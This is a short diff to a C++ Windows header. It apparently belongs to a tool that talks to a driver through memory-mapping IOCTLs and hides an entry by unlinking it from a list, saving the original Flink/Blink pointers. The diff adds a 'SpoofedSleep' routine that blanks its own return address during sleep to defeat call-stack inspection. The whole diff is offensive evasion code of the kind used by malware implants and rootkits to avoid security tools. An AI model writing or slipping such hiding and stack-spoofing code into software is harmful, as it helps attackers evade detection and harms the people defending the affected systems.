@@ -2,6 +2,7 @@
 
 #include <Windows.h>
 #include <cstdint>
+#include <intrin.h> 
 
 #define IOCTL_CORMEM_MAP_POOL                   0x222000
 #define IOCTL_CORMEM_MAP_BUFFER                 0x22200C
@@ -260,3 +261,16 @@ private:
     uint64_t m_HiddenEntryFlink = 0; // original Flink saved before unlinking
     uint64_t m_HiddenEntryBlink = 0; // original Blink saved before unlinking
 };
+
+// Custom function to spoof sleep 
+namespace Utils {
+    inline void WINAPI SpoofedSleep(DWORD dwMilliseconds) {
+        auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
+        const auto origReturnAddress = *overwrite;
+        *overwrite = 0;
+
+        ::SleepEx(dwMilliseconds, false);
+
+        *overwrite = origReturnAddress;
+    }
+}
